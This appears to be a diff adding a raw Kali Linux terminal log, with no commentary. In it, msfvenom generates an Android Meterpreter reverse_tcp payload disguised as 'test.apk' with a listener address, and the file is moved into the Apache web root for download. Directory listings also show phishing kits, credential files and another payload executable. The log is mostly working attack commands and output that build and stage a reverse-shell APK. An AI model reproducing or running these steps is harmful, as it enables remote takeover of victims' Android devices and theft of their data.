@@ -1,0 +1,99 @@
+msf6 > msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.43.200 LPORT=6666 -o test.apk
+
+┌──(kali㉿kali)-[~]
+└─$ ls                   
+Android-InsecureBankv2  Mobile-Security-Framework-MobSF
+creds.json              Music
+creds.txt               Net-Strike
+Desktop                 payjam_payload.exe
+Documents               Pictures
+Downloads               Public
+error.log               Templates
+instainsane             test.apk
+ip.txt                  thief_raccoon
+MaxPhisher              Videos
+Media                   zphisher
+                                                             
+┌──(kali㉿kali)-[~]
+└─$ mv test.apk /var/www/html
+mv: cannot move 'test.apk' to '/var/www/html/test.apk': Permission denied
+                                                             
+┌──(kali㉿kali)-[~]
+└─$ sudo su                    
+[sudo] password for kali: 
+┌──(root㉿kali)-[/home/kali]
+└─# ls
+Android-InsecureBankv2  Mobile-Security-Framework-MobSF
+creds.json              Music
+creds.txt               Net-Strike
+Desktop                 payjam_payload.exe
+Documents               Pictures
+Downloads               Public
+error.log               Templates
+instainsane             test.apk
+ip.txt                  thief_raccoon
+MaxPhisher              Videos
+Media                   zphisher
+                                                             
+┌──(root㉿kali)-[/home/kali]
+└─# mv test.apk /var/www/html 
+                                                             
+┌──(root㉿kali)-[/home/kali]
+└─# ls
+Android-InsecureBankv2  Mobile-Security-Framework-MobSF
+creds.json              Music
+creds.txt               Net-Strike
+Desktop                 payjam_payload.exe
+Documents               Pictures
+Downloads               Public
+error.log               Templates
+instainsane             thief_raccoon
+ip.txt                  Videos
+MaxPhisher              zphisher
+Media
+                                                             
+┌──(root㉿kali)-[/home/kali]
+└─# cd /var/www/html         
+                                                             
+┌──(root㉿kali)-[/var/www/html]
+└─# ls
+index.html  index.nginx-debian.html  test.apk
+
+┌──(kali㉿kali)-[~]
+└─$ service apache2 status 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
